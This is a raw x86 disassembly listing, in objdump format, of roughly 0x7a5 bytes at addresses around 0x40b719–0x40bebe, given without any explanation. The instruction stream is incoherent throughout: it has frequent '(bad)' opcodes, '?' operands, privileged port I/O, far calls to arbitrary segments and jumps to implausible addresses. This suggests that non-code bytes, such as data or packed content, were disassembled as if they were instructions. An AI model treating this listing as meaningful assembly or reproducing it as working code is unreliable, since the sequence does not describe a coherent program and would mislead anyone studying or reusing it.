  40b719:	add    eax,0x45620bac
  40b71e:	arpl   WORD PTR [edi+0x704844bd],bx
  40b724:	pop    edx
  40b725:	stos   BYTE PTR es:[edi],al
  40b726:	outs   dx,BYTE PTR ds:[esi]
  40b727:	and    ebx,DWORD PTR [eax]
  40b729:	call   0x8f44e633
  40b72e:	cmp    eax,0x42a96b9e
  40b733:	mov    ds:0xd964b3d1,al
  40b738:	inc    edx
  40b739:	pusha  
  40b73a:	pop    ecx
  40b73b:	loop   0x40b6fd
  40b73d:	mov    al,BYTE PTR [edx-0x3f48809e]
  40b743:	int    0x79
  40b745:	jmp    0xd44e9d66
  40b74a:	mov    esi,0x245d8a8
  40b74f:	in     eax,0x78
  40b751:	inc    ecx
  40b752:	into   
  40b753:	jbe    0x40b795
  40b755:	push   es
  40b756:	(bad)  
  40b757:	mov    ds:0x98e880e,eax
  40b75c:	mov    al,ds:0x147163eb
  40b761:	fwait
  40b762:	(bad)  
  40b763:	jp     0x40b71f
  40b765:	push   ebp
  40b766:	cmc    
  40b767:	xchg   DWORD PTR [edx-0x4ba4139c],ebx
  40b76d:	or     esi,DWORD PTR [ebx+0x30]
  40b770:	and    eax,0x71881013
  40b775:	inc    ebx
  40b776:	mov    bl,0x3d
  40b778:	outs   dx,DWORD PTR ds:[esi]
  40b779:	cld    
  40b77a:	fwait
  40b77b:	mov    ?,WORD PTR [esi-0x7e]
  40b77e:	jmp    0x40b7bc
  40b780:	popa   
  40b781:	popf   
  40b782:	ja     0x40b752
  40b784:	inc    ebp
  40b785:	mov    eax,0xabbd1693
  40b78a:	call   0x48e6:0xe1a62481
  40b791:	nop
  40b792:	dec    ecx
  40b793:	sbb    al,0x30
  40b795:	dec    ecx
  40b796:	cmc    
  40b797:	cmp    ebp,DWORD PTR [ebx]
  40b799:	adc    BYTE PTR [ebx],ah
  40b79b:	cli    
  40b79c:	xlat   BYTE PTR ds:[ebx]
  40b79d:	jns    0x40b768
  40b79f:	leave  
  40b7a0:	mov    ds:0x13e8ce21,al
  40b7a5:	sbb    bh,BYTE PTR [bp+di+0x4f]
  40b7a9:	aam    0xc4
  40b7ab:	hlt    
  40b7ac:	inc    esp
  40b7ad:	push   ds
  40b7ae:	data16 mov ch,0x1
  40b7b1:	sub    bh,al
  40b7b3:	dec    edi
  40b7b4:	call   0x67de6b4d
  40b7b9:	cld    
  40b7ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7bb:	mov    ah,0x74
  40b7bd:	sbb    DWORD PTR [esi],ecx
  40b7bf:	xchg   BYTE PTR [ebx+ecx*1],ah
  40b7c2:	adc    ecx,DWORD PTR [edx-0x181914e4]
  40b7c8:	hlt    
  40b7c9:	lods   eax,DWORD PTR ds:[esi]
  40b7ca:	inc    edi
  40b7cb:	push   edi
  40b7cc:	mov    dl,cl
  40b7ce:	call   0x79a417ba
  40b7d3:	jb     0x40b790
  40b7d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7d6:	adc    eax,0x8c9ffb4b
  40b7db:	add    BYTE PTR [ebx-0x3e191d96],bh
  40b7e1:	and    ebx,esi
  40b7e3:	sub    BYTE PTR fs:[esi],ch
  40b7e6:	out    0xb6,eax
  40b7e8:	outs   dx,BYTE PTR ds:[esi]
  40b7e9:	dec    edi
  40b7ea:	inc    ecx
  40b7eb:	mov    ss,WORD PTR [ecx+0x29]
  40b7ee:	(bad)  
  40b7ef:	and    al,0x4c
  40b7f1:	mov    esp,0x4dcdf1f8
  40b7f6:	je     0x40b822
  40b7f8:	mov    edx,0xa8a08dd
  40b7fd:	mov    bh,0xda
  40b7ff:	test   DWORD PTR [ecx],0xd7cd88b8
  40b805:	div    BYTE PTR ds:0x40975129
  40b80b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b80c:	aas    
  40b80d:	iret   
  40b80e:	inc    ebx
  40b80f:	imul   ecx,DWORD PTR [edi+0x68],0x4308340e
  40b816:	lock (bad) 
  40b818:	repnz (bad) 
  40b81a:	sub    al,0xe6
  40b81c:	rcl    BYTE PTR [edi-0x310d0d3b],cl
  40b822:	fiadd  WORD PTR [ebx+0x1ec69a04]
  40b828:	(bad)  
  40b82a:	shl    DWORD PTR [edx],1
  40b82c:	icebp  
  40b82d:	std    
  40b82e:	dec    ebp
  40b82f:	pop    edx
  40b830:	neg    edi
  40b832:	(bad)  
  40b833:	push   ecx
  40b834:	jecxz  0x40b86b
  40b836:	icebp  
  40b837:	jns    0x40b7bb
  40b839:	jb     0x40b8ad
  40b83b:	push   ecx
  40b83c:	jmp    DWORD PTR [ebx*8+0x630fbb64]
  40b843:	ss stos BYTE PTR es:[edi],al
  40b845:	dec    esi
  40b846:	mov    al,ds:0xe3231a39
  40b84b:	mov    dl,cl
  40b84d:	ins    DWORD PTR es:[edi],dx
  40b84e:	stos   DWORD PTR es:[edi],eax
  40b84f:	(bad)  
  40b850:	fwait
  40b851:	dec    esi
  40b852:	ret    0xd4b4
  40b855:	pop    ss
  40b856:	out    0x85,al
  40b858:	shl    DWORD PTR [ebx-0x21],cl
  40b85b:	jns    0x40b7ec
  40b85d:	mov    eax,0x7ca65498
  40b862:	retf   
  40b863:	push   es
  40b864:	stc    
  40b865:	sbb    DWORD PTR [esp+eax*4],eax
  40b868:	xlat   BYTE PTR ds:[ebx]
  40b869:	imul   eax,DWORD PTR [ecx],0x94017e16
  40b86f:	ficom  DWORD PTR [edx-0x1d]
  40b872:	sub    DWORD PTR [edi],edi
  40b874:	mov    edx,fs
  40b876:	mov    esp,0xd4340da7
  40b87b:	push   esp
  40b87c:	or     ah,0x31
  40b87f:	mov    edi,0x66e4bc21
  40b884:	test   BYTE PTR [edx-0x17],ch
  40b887:	add    DWORD PTR [eax+0x2bb8ae41],ecx
  40b88d:	sbb    bl,ah
  40b88f:	xor    eax,edi
  40b891:	call   0x91e6:0x92f84891
  40b898:	fnstenv [ebx-0x704bd392]
  40b89e:	nop
  40b89f:	cld    
  40b8a0:	xchg   ebp,edi
  40b8a2:	mov    es,eax
  40b8a4:	js     0x40b8ac
  40b8a6:	dec    edx
  40b8a7:	int    0xe1
  40b8a9:	icebp  
  40b8aa:	ret    
  40b8ab:	je     0x40b856
  40b8ad:	inc    ecx
  40b8ae:	sub    ebx,0x719de703
  40b8b4:	imul   esp,DWORD PTR [esi+0x23],0xffffffc0
  40b8b8:	pop    ebp
  40b8b9:	les    ecx,FWORD PTR [ebx+0x2edd1ec4]
  40b8bf:	inc    ecx
  40b8c0:	add    ebp,DWORD PTR [ebx-0x67]
  40b8c3:	mov    bh,0xcf
  40b8c5:	sbb    ch,BYTE PTR [edx-0xc]
  40b8c8:	pop    esp
  40b8c9:	imul   esp,DWORD PTR [ebp+0x21aadcb4],0x793110d8
  40b8d3:	dec    ebx
  40b8d4:	imul   eax,DWORD PTR ds:0xee39a373,0xd9254812
  40b8de:	ins    DWORD PTR es:[edi],dx
  40b8df:	daa    
  40b8e0:	pop    edi
  40b8e1:	add    ebx,ebx
  40b8e3:	loope  0x40b8cf
  40b8e5:	mov    eax,ds:0xe8aba19
  40b8ea:	js     0x40b86d
  40b8ec:	xor    DWORD PTR [edi-0x6417372],ebp
  40b8f2:	mov    esp,0xde48199c
  40b8f7:	adc    DWORD PTR [ebx],0x1b
  40b8fa:	and    eax,0x2d34ee7e
  40b8ff:	pop    ebp
  40b900:	add    esi,ecx
  40b902:	out    dx,eax
  40b903:	je     0x40b8d8
  40b905:	(bad)  
  40b906:	std    
  40b907:	push   esp
  40b908:	scas   eax,DWORD PTR es:[edi]
  40b909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b90a:	mov    ecx,?
  40b90c:	in     eax,0x3b
  40b90e:	and    esi,esp
  40b910:	neg    DWORD PTR [esi]
  40b912:	push   esp
  40b913:	and    DWORD PTR [eax],0xc39a65cb
  40b919:	sbb    DWORD PTR [ecx],edi
  40b91b:	leave  
  40b91c:	fbld   TBYTE PTR [ecx+0x327d995f]
  40b922:	popa   
  40b923:	sub    eax,0xe15a5b6e
  40b928:	mov    ds:0xf484a9ea,eax
  40b92d:	repz std 
  40b92f:	xor    ebp,DWORD PTR [eax-0x1c]
  40b932:	xor    BYTE PTR [ecx-0xc],0xeb
  40b936:	xchg   esi,eax
  40b937:	push   ebp
  40b938:	mov    edi,0x4265a473
  40b93d:	fwait
  40b93e:	ret    0x2dfa
  40b941:	or     al,0xe8
  40b943:	sbb    BYTE PTR [edi-0xfd17fe7],bl
  40b949:	pop    ds
  40b94a:	mov    esp,0x6f45a816
  40b94f:	add    eax,0x6ea94947
  40b954:	inc    eax
  40b955:	push   ecx
  40b956:	popa   
  40b957:	add    cl,BYTE PTR [edx+0x3f4a3525]
  40b95d:	fidivr WORD PTR [edx-0x1e]
  40b960:	call   0xeb9c:0x3d0eec2b
  40b967:	push   0x139592b0
  40b96c:	ret    
  40b96d:	arpl   WORD PTR [ebx-0x7c84a72c],si
  40b973:	and    bh,BYTE PTR [ebx+ebx*1-0x140e2fd5]
  40b97a:	push   ds
  40b97b:	dec    edx
  40b97c:	add    al,dl
  40b97e:	pop    ebp
  40b97f:	or     bh,bl
  40b981:	loope  0x40b90b
  40b983:	push   DWORD PTR [edx+0x71e71fc2]
  40b989:	sub    DWORD PTR [edx],0x13
  40b98c:	mov    esp,0x53a573af
  40b991:	mov    dh,al
  40b993:	loopne 0x40b9f3
  40b995:	stc    
  40b996:	out    dx,eax
  40b997:	data16 mov dl,0xdf
  40b99a:	jl     0x40b95d
  40b99c:	adc    BYTE PTR [ebp-0x4f2bf608],0xf3
  40b9a3:	call   0xabe17aa6
  40b9a8:	add    DWORD PTR [eax-0x80],0x15064b05
  40b9af:	pop    ebp
  40b9b0:	add    al,BYTE PTR [edi-0x57e617f7]
  40b9b6:	test   DWORD PTR [ecx],esi
  40b9b8:	adc    BYTE PTR [ecx],cl
  40b9ba:	clc    
  40b9bb:	push   0xdd07d19b
  40b9c0:	jo     0x40b9dc
  40b9c2:	and    al,0x63
  40b9c4:	hlt    
  40b9c5:	jle    0x40b99d
  40b9c7:	repnz xor edi,eax
  40b9ca:	mov    ds:0xc949eda2,eax
  40b9cf:	cs mov ebx,0x8e8181b8
  40b9d5:	push   edx
  40b9d6:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40b9d8:	mov    ecx,0xd9dbbafb
  40b9dd:	mul    DWORD PTR [eax-0x32]
  40b9e0:	lds    eax,FWORD PTR [eax]
  40b9e2:	rcl    DWORD PTR [ebp-0x1],1
  40b9e5:	mov    ah,0xf8
  40b9e7:	xor    eax,0x5b00656a
  40b9ec:	popa   
  40b9ed:	mov    ebx,0x872cda33
  40b9f2:	enter  0x11ef,0x49
  40b9f6:	and    eax,0x575c985c
  40b9fb:	xchg   BYTE PTR [ecx+eiz*8],ch
  40b9fe:	pop    eax
  40b9ff:	repnz mov al,ds:0xc4ccff32
  40ba05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba06:	cs dec ebp
  40ba08:	xchg   BYTE PTR [esi],ah
  40ba0a:	(bad)  
  40ba0b:	jp     0x40ba1a
  40ba0d:	aad    0x1f
  40ba0f:	mov    cl,0x39
  40ba11:	xchg   edi,eax
  40ba12:	lods   eax,DWORD PTR ds:[esi]
  40ba13:	in     eax,0xaf
  40ba15:	xchg   ecx,eax
  40ba16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba17:	add    eax,0xaafe04b9
  40ba1c:	or     DWORD PTR [ebx+ebx*1-0x5113b293],edx
  40ba23:	ins    DWORD PTR es:[edi],dx
  40ba24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba25:	or     ebp,DWORD PTR ds:0x9515a404
  40ba2b:	lock push ebp
  40ba2d:	or     cl,BYTE PTR [eax-0x4f2ba1a3]
  40ba33:	add    DWORD PTR [ecx-0x55040357],edx
  40ba39:	call   0x41686d5d
  40ba3e:	push   eax
  40ba3f:	push   ecx
  40ba40:	je     0x40ba30
  40ba42:	repz out 0xfc,al
  40ba45:	push   edi
  40ba46:	push   0xbe370e35
  40ba4b:	mov    dh,0xd7
  40ba4d:	inc    eax
  40ba4e:	jg     0x40ba51
  40ba50:	dec    ebp
  40ba51:	jmp    0xb30:0xf989aaa7
  40ba58:	jg     0x40b9e6
  40ba5a:	in     eax,0x1f
  40ba5c:	xchg   DWORD PTR [edx],ebx
  40ba5e:	idiv   DWORD PTR [esi-0x1a]
  40ba61:	les    edx,FWORD PTR [ebp+0x70ddcfe7]
  40ba67:	into   
  40ba68:	and    BYTE PTR [edx+0x7a9189bd],bh
  40ba6e:	xor    al,bh
  40ba70:	call   0x533a7095
  40ba75:	mov    WORD PTR [edi],?
  40ba77:	mov    ch,0xd1
  40ba79:	mov    ebp,0xf6c1e2d
  40ba7e:	sbb    al,0x91
  40ba80:	es add esi,eax
  40ba83:	aad    0x7a
  40ba85:	adc    DWORD PTR [eax-0x4e],esi
  40ba88:	jne    0x40bafc
  40ba8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba8b:	or     dl,BYTE PTR [eax+0x30]
  40ba8e:	cmp    BYTE PTR [ebx+0x5e],ch
  40ba91:	and    BYTE PTR [ebx],ch
  40ba93:	imul   edx,DWORD PTR [ebx+0x46d78e8d],0x25
  40ba9a:	mov    ds:0x7a31ff0c,al
  40ba9f:	dec    ecx
  40baa0:	mov    esp,0x6a28ec2a
  40baa5:	loopne 0x40bb20
  40baa7:	xchg   DWORD PTR [edi],eax
  40baa9:	pop    ss
  40baaa:	cdq    
  40baab:	es loope 0x40bab2
  40baae:	dec    edx
  40baaf:	mov    al,0xee
  40bab1:	inc    ebp
  40bab2:	sub    BYTE PTR [ecx+0x528c7009],ah
  40bab8:	pop    ebx
  40bab9:	and    edx,DWORD PTR [ebx+0x437baee]
  40babf:	mov    ?,WORD PTR ds:0xa63426f0
  40bac5:	fisubr WORD PTR ds:0x940dc12f
  40bacb:	sbb    esp,DWORD PTR [ebp-0x3f8dc5c7]
  40bad1:	jb     0x40babd
  40bad3:	inc    esp
  40bad4:	js     0x40bafd
  40bad6:	nop
  40bad7:	adc    dl,BYTE PTR [ebx+0x41bbeec4]
  40badd:	in     al,dx
  40bade:	push   esi
  40badf:	pop    ebx
  40bae0:	pop    esp
  40bae1:	push   esp
  40bae2:	ret    
  40bae3:	stc    
  40bae4:	add    DWORD PTR [esi-0x7806bdfe],ebp
  40baea:	retf   
  40baeb:	cmp    cl,cl
  40baed:	fcmovbe st,st(1)
  40baef:	into   
  40baf0:	jns    0x40bb0c
  40baf2:	fisub  WORD PTR [ebx]
  40baf4:	shr    BYTE PTR [ecx],0xd4
  40baf7:	rcr    BYTE PTR [edx+0x776e427],cl
  40bafd:	rol    BYTE PTR [esi+esi*8-0x69619d94],cl
  40bb04:	add    ecx,DWORD PTR [ebp+esi*2+0x1a6ee3f9]
  40bb0b:	hlt    
  40bb0c:	lea    ecx,[edx+0x363e6381]
  40bb12:	adc    BYTE PTR [esi-0x5],bl
  40bb15:	mov    ch,0xfc
  40bb17:	stos   DWORD PTR es:[edi],eax
  40bb18:	aam    0xa3
  40bb1a:	jle    0x40bac8
  40bb1c:	sub    bl,BYTE PTR [edi+0xc0e1f1f]
  40bb22:	test   eax,0x7d27e9e
  40bb27:	fs popf 
  40bb29:	adc    eax,0x7a7f815d
  40bb2e:	fldcw  WORD PTR ds:0x57d53e39
  40bb34:	imul   edx,DWORD PTR [esi],0xffffff92
  40bb37:	push   cs
  40bb38:	mov    esi,0x6bd21030
  40bb3d:	push   edi
  40bb3e:	inc    edi
  40bb3f:	inc    ebx
  40bb40:	pop    edi
  40bb41:	and    eax,0x831e837f
  40bb46:	mov    eax,0xc8c6d1bc
  40bb4b:	in     eax,0x2
  40bb4d:	sbb    al,0x54
  40bb4f:	mov    ebp,0x1b249606
  40bb54:	xor    eax,0xe55407bb
  40bb59:	dec    ebx
  40bb5a:	out    dx,al
  40bb5b:	cmovnp ecx,edi
  40bb5e:	bound  esi,QWORD PTR [esi+0x23]
  40bb61:	retf   
  40bb62:	mov    ds:0xfdcb6c93,eax
  40bb67:	call   FWORD PTR [ecx]
  40bb69:	ret    
  40bb6a:	mov    eax,ds:0xe751d43a
  40bb6f:	stos   BYTE PTR es:[edi],al
  40bb70:	push   ds
  40bb71:	in     al,dx
  40bb72:	pop    ss
  40bb73:	mov    bh,0x14
  40bb75:	jae    0x40bb11
  40bb77:	mov    BYTE PTR ds:0x3b9c0d84,dh
  40bb7d:	lds    edx,FWORD PTR ds:0xc5c0943c
  40bb83:	scas   al,BYTE PTR es:[edi]
  40bb84:	aaa    
  40bb85:	lock ret 
  40bb87:	adc    BYTE PTR ds:0xb395d909,dl
  40bb8d:	and    eax,0x8b84b727
  40bb92:	and    BYTE PTR [edi-0x53],0x32
  40bb96:	dec    ebp
  40bb97:	sub    al,0x24
  40bb99:	pop    ecx
  40bb9a:	popa   
  40bb9b:	cld    
  40bb9c:	jb     0x40bb65
  40bb9e:	pop    ds
  40bb9f:	adc    DWORD PTR [eax],0x50c12660
  40bba5:	sub    eax,0xb6bd4dfb
  40bbaa:	cmc    
  40bbab:	adc    edx,eax
  40bbad:	xchg   ebx,eax
  40bbae:	das    
  40bbaf:	scas   eax,DWORD PTR es:[edi]
  40bbb0:	and    bh,cl
  40bbb2:	mov    ebx,DWORD PTR [ebp+edi*1+0x28]
  40bbb6:	in     al,0x15
  40bbb8:	out    dx,al
  40bbb9:	cs push ebx
  40bbbb:	or     al,0x97
  40bbbd:	int    0x37
  40bbbf:	jge    0x40bb7d
  40bbc1:	push   0xffffff8c
  40bbc3:	sbb    eax,0xee064a4a
  40bbc8:	push   cs
  40bbc9:	stc    
  40bbca:	inc    edx
  40bbcb:	and    DWORD PTR [ecx-0x4fb5b547],ecx
  40bbd1:	xchg   edx,eax
  40bbd2:	scas   eax,DWORD PTR es:[edi]
  40bbd3:	jo     0x40bc2a
  40bbd5:	js     0x40bb64
  40bbd7:	mov    dh,0xf6
  40bbd9:	out    dx,al
  40bbda:	cmp    DWORD PTR [eax+0x36],ebx
  40bbdd:	clc    
  40bbde:	pop    edx
  40bbdf:	pop    edi
  40bbe0:	pop    esp
  40bbe1:	mov    ch,0x14
  40bbe3:	mov    al,ds:0x559c7a52
  40bbe8:	int3   
  40bbe9:	inc    ebp
  40bbea:	jno    0x40bc5b
  40bbec:	lahf   
  40bbed:	cld    
  40bbee:	shl    al,cl
  40bbf0:	dec    eax
  40bbf1:	mov    esp,0x1b2dea1e
  40bbf6:	cmp    ch,bh
  40bbf8:	(bad)  [edx-0x5af04b28]
  40bbfe:	dec    ebp
  40bbff:	jo     0x40bc1a
  40bc01:	shr    BYTE PTR [ecx+eax*2],1
  40bc04:	(bad)
  40bc08:	xchg   DWORD PTR [eax],ecx
  40bc0a:	icebp  
  40bc0b:	enter  0x23c9,0xb2
  40bc0f:	fstp   QWORD PTR [esi+eax*1]
  40bc12:	outs   dx,DWORD PTR ds:[esi]
  40bc13:	jle    0x40bb9f
  40bc15:	adc    eax,0x5067e193
  40bc1a:	push   edx
  40bc1b:	xor    al,0x97
  40bc1d:	out    dx,eax
  40bc1e:	add    esi,eax
  40bc20:	mov    al,0xd1
  40bc22:	dec    eax
  40bc23:	(bad)
  40bc27:	add    eax,DWORD PTR [edi+0x43]
  40bc2a:	mov    bh,0xd6
  40bc2c:	mov    esp,0xaa44bd6c
  40bc31:	mov    ds:0xc200f021,eax
  40bc36:	inc    eax
  40bc37:	or     eax,0xd66d0935
  40bc3c:	ins    BYTE PTR es:[edi],dx
  40bc3d:	mov    edx,0xa02dfa09
  40bc42:	pop    edx
  40bc43:	fdivr  QWORD PTR [ebp-0x22]
  40bc46:	cmp    al,0x98
  40bc48:	xor    dl,BYTE PTR [ecx+edi*1-0x4a]
  40bc4c:	aam    0xe6
  40bc4e:	scas   eax,DWORD PTR es:[edi]
  40bc4f:	ja     0x40bcca
  40bc51:	jae    0x40bc43
  40bc53:	pop    edi
  40bc54:	and    ecx,0xa4b8d828
  40bc5a:	movd   mm5,ebx
  40bc5d:	ss test eax,0x7b477dee
  40bc63:	add    esp,DWORD PTR [ecx]
  40bc65:	cmc    
  40bc66:	mov    ds:0xd5ba75dc,eax
  40bc6b:	pop    ss
  40bc6c:	xchg   edx,eax
  40bc6d:	mov    esp,ebp
  40bc6f:	test   ecx,eax
  40bc71:	or     dh,cl
  40bc73:	or     BYTE PTR [ecx],al
  40bc75:	je     0x40bc49
  40bc77:	adc    DWORD PTR [edx+0x20e43d64],ebx
  40bc7d:	mov    ch,0xf8
  40bc7f:	mov    bh,0x55
  40bc81:	or     ch,BYTE PTR [esi+0x2ccc7e42]
  40bc87:	xor    DWORD PTR [eax-0x12],ecx
  40bc8a:	loopne 0x40bc7b
  40bc8c:	(bad)  
  40bc8d:	sti    
  40bc8e:	inc    esi
  40bc8f:	cmp    esp,DWORD PTR [eax+0x4876684]
  40bc95:	mov    esi,0x27eb0e3a
  40bc9a:	add    BYTE PTR [eax+0x7],bh
  40bc9d:	pushf  
  40bc9e:	sar    DWORD PTR [esi+0x700f9fe4],0xb4
  40bca5:	or     eax,0x9210b8ab
  40bcaa:	test   al,0xaf
  40bcac:	nop
  40bcad:	cmp    cl,BYTE PTR [ebp-0x9]
  40bcb0:	push   esi
  40bcb1:	test   DWORD PTR [eax+0x71e69cf5],0xa191b95a
  40bcbb:	jb     0x40bc76
  40bcbd:	cli    
  40bcbe:	jle    0x40bd22
  40bcc0:	add    eax,0x51abded
  40bcc5:	adc    cl,BYTE PTR [edx]
  40bcc7:	in     eax,0x3
  40bcc9:	sbb    al,0xab
  40bccb:	lds    ebx,FWORD PTR [ebx-0x32]
  40bcce:	push   es
  40bccf:	pusha  
  40bcd0:	dec    esp
  40bcd1:	jecxz  0x40bcc0
  40bcd3:	xor    DWORD PTR [ebx+0x4eb943a4],esi
  40bcd9:	cmp    bh,BYTE PTR [eax]
  40bcdb:	and    eax,0xe96ca095
  40bce0:	stos   BYTE PTR es:[edi],al
  40bce1:	mov    ecx,0xef7b2170
  40bce6:	loopne 0x40bcd4
  40bce8:	rcl    BYTE PTR [eax],1
  40bcea:	push   edi
  40bceb:	sub    ebp,DWORD PTR [ebp+0x15]
  40bcee:	aad    0x37
  40bcf0:	or     al,0x85
  40bcf2:	cmp    BYTE PTR [ecx],ch
  40bcf4:	rcr    BYTE PTR [edx-0x35],cl
  40bcf7:	bound  eax,QWORD PTR [ebx+0x46]
  40bcfa:	and    ah,BYTE PTR [eax]
  40bcfc:	into   
  40bcfd:	fwait
  40bcfe:	xchg   ebp,eax
  40bcff:	ds mov edi,0x81562bdd
  40bd05:	test   al,0xb6
  40bd07:	dec    edx
  40bd08:	dec    ecx
  40bd09:	loop   0x40bd19
  40bd0b:	add    ecx,DWORD PTR [edx+ebx*8+0x208adcd8]
  40bd12:	cmp    DWORD PTR [ecx-0x7293a478],esi
  40bd18:	jbe    0x40bd32
  40bd1a:	or     DWORD PTR [ebp+0x4b267823],0xffffffd6
  40bd21:	shr    DWORD PTR [eax+0x1988f51f],1
  40bd27:	addr16 cwde 
  40bd29:	xor    al,0x69
  40bd2b:	and    DWORD PTR [ebp+0x2dd5c98d],ecx
  40bd31:	mov    ebp,DWORD PTR [edi]
  40bd33:	jecxz  0x40bcf8
  40bd35:	xor    ebx,DWORD PTR [ecx+0x21]
  40bd38:	sub    bh,BYTE PTR [edi-0x22]
  40bd3b:	pop    ecx
  40bd3c:	cmp    ebx,DWORD PTR [esi]
  40bd3e:	aaa    
  40bd3f:	int3   
  40bd40:	jnp    0x40bdb1
  40bd42:	mov    ecx,0x56068b2b
  40bd47:	push   esp
  40bd48:	xor    eax,0x45d162e6
  40bd4d:	into   
  40bd4e:	mov    edx,0xa49740cc
  40bd53:	test   eax,0x592048e
  40bd58:	adc    eax,0x79492413
  40bd5d:	mov    dl,0xa0
  40bd5f:	mov    ah,0x1
  40bd61:	add    DWORD PTR [edx],edx
  40bd63:	xchg   ebx,eax
  40bd64:	cmp    BYTE PTR [eax+0x2c],0x93
  40bd68:	out    dx,al
  40bd69:	and    al,0xa7
  40bd6b:	mov    bh,0x21
  40bd6d:	not    BYTE PTR [edx+0x7ddb4b04]
  40bd73:	mul    esp
  40bd75:	xlat   BYTE PTR ds:[ebx]
  40bd76:	push   esp
  40bd77:	ret    
  40bd78:	mov    al,ds:0xbfd59dbb
  40bd7d:	mov    dl,BYTE PTR [edi+0x705bcf97]
  40bd83:	jmp    0x40bdc6
  40bd85:	into   
  40bd86:	je     0x40bd69
  40bd88:	fnstenv [eax-0x3bdc174e]
  40bd8e:	mov    ebp,0x2b137271
  40bd93:	mov    al,ds:0x3af09dce
  40bd98:	xchg   edi,eax
  40bd99:	ret    0x10f8
  40bd9c:	cmp    BYTE PTR [ecx+0x5ceb80ed],bh
  40bda2:	fsub   QWORD PTR [edx]
  40bda4:	cmova  edi,DWORD PTR [edi-0x3a]
  40bda8:	ja     0x40be10
  40bdaa:	and    edx,eax
  40bdac:	(bad)  
  40bdad:	lods   eax,DWORD PTR ds:[esi]
  40bdae:	dec    edi
  40bdaf:	push   esp
  40bdb0:	xor    ecx,ebx
  40bdb2:	mov    dl,0xa
  40bdb4:	xchg   edx,eax
  40bdb5:	jecxz  0x40be19
  40bdb7:	lods   eax,DWORD PTR ds:[esi]
  40bdb8:	pop    ss
  40bdb9:	mov    WORD PTR [edx+0x51137615],ss
  40bdbf:	push   eax
  40bdc0:	pop    ds
  40bdc1:	cmp    bh,BYTE PTR [edx-0x6ab7ae55]
  40bdc7:	add    BYTE PTR [ebp-0x37],al
  40bdca:	not    DWORD PTR [edi+0x5cf9f213]
  40bdd0:	scas   eax,DWORD PTR es:[edi]
  40bdd1:	add    esi,edi
  40bdd3:	gs pop eax
  40bdd5:	mov    esi,0x6d243ea2
  40bdda:	mov    ch,0xa
  40bddc:	test   al,0x64
  40bdde:	pusha  
  40bddf:	xlat   BYTE PTR ds:[ebx]
  40bde0:	imul   ebx,DWORD PTR [ebx],0xffffff86
  40bde3:	je     0x40be5a
  40bde5:	add    al,0xb3
  40bde7:	mov    bh,bh
  40bde9:	fdiv   DWORD PTR [ebx]
  40bdeb:	loopne 0x40be18
  40bded:	cmp    edi,DWORD PTR [edi]
  40bdef:	dec    ebp
  40bdf1:	xchg   ecx,eax
  40bdf2:	ret    0x93d4
  40bdf5:	mov    cl,0xe6
  40bdf7:	cmp    al,0x4c
  40bdf9:	pop    esp
  40bdfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdfb:	dec    edx
  40bdfc:	lods   al,BYTE PTR ds:[esi]
  40bdfd:	fnstenv [ecx+0x3d]
  40be00:	mov    cl,BYTE PTR [ecx-0x256ed8d9]
  40be06:	sub    esi,DWORD PTR [ecx+eiz*4-0x71]
  40be0a:	clc    
  40be0b:	sbb    al,0x6f
  40be0d:	xchg   BYTE PTR [edi],ch
  40be0f:	mov    esi,0xdcddf096
  40be14:	xchg   BYTE PTR [edi+0x57053c2c],al
  40be1a:	in     eax,0xd
  40be1c:	out    0x2b,al
  40be1e:	dec    edi
  40be1f:	push   cs
  40be20:	jne    0x40be0e
  40be22:	xchg   edx,eax
  40be23:	pushf  
  40be24:	loopne 0x40be6e
  40be26:	es cmp eax,0x3b53f96a
  40be2c:	and    eax,0xf923f4b0
  40be31:	xor    esi,DWORD PTR [edx+0x125d2628]
  40be37:	inc    ebx
  40be38:	ds sti 
  40be3a:	ja     0x40be8e
  40be3c:	dec    ecx
  40be3d:	ja     0x40bdec
  40be3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be40:	mov    al,ds:0xd5215705
  40be45:	mov    esp,0xc7d4b310
  40be4a:	scas   al,BYTE PTR es:[edi]
  40be4b:	push   ds
  40be4c:	fadd   QWORD PTR [edi-0x11]
  40be4f:	(bad)  
  40be51:	and    DWORD PTR [ebp-0x43f7fd86],ebx
  40be57:	push   eax
  40be58:	ins    DWORD PTR es:[edi],dx
  40be59:	push   ebp
  40be5a:	add    edx,DWORD PTR [edx+0x3d]
  40be5d:	fbstp  TBYTE PTR [edi]
  40be5f:	xchg   ebx,eax
  40be60:	loope  0x40be29
  40be62:	and    DWORD PTR [edx+0x7b],ecx
  40be65:	jae    0x40be6a
  40be67:	or     BYTE PTR [ebp-0x4bfc85ec],cl
  40be6d:	inc    ebp
  40be6e:	cli    
  40be6f:	out    dx,eax
  40be70:	lods   eax,DWORD PTR ds:[esi]
  40be71:	(bad)  
  40be72:	stc    
  40be73:	test   eax,0x975bc83b
  40be78:	or     edx,ebp
  40be7a:	mov    ds:0xb6e44d06,eax
  40be7f:	mov    dh,0x6b
  40be81:	mov    ds:0xe6267cd8,eax
  40be86:	enter  0xd607,0x9a
  40be8a:	push   ss
  40be8b:	js     0x40be9c
  40be8d:	inc    ebp
  40be8e:	cmp    BYTE PTR [edx+0x31],bl
  40be91:	call   0x8f96:0x71d69a61
  40be98:	nop
  40be99:	inc    ebp
  40be9a:	repnz cmp eax,DWORD PTR [ebx]
  40be9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be9e:	pop    ebp
  40be9f:	fnstenv [edx+0x2dbbeeaf]
  40bea5:	cwde   
  40bea6:	test   eax,0x5734826e
  40beab:	in     eax,0xd7
  40bead:	rcl    BYTE PTR [ebx],1
  40beaf:	popf   
  40beb0:	out    0xfa,al
  40beb2:	xchg   ecx,eax
  40beb3:	add    DWORD PTR [eax],edi
  40beb5:	icebp  
  40beb6:	cmc    
  40beb7:	jb     0x40bf17
  40beb9:	loope  0x40bedd
  40bebb:	arpl   WORD PTR [ecx+ebp*4],cx
  40bebe:	add    edi,eax
